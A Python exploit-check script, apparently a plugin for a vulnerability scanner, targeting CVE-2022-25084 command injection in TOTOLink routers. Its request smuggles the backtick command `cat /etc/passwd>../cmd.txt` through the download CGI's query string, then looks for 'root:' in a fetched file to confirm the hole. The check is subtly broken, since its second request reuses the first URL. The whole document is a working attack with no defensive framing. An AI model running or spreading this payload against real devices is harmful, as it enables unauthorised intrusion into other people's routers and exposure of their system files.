#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'TOTOLink 多个设备 download.cgi 远程命令执行漏洞 CVE-2022-25084',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/cgi-bin/downloadFlile.cgi?payload=`cat /etc/passwd>../cmd.txt`"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200:
      url2 = url + 'cmd.txt'
      res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
      if res.status_code == 200 and 'root:' in res.text:
        ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret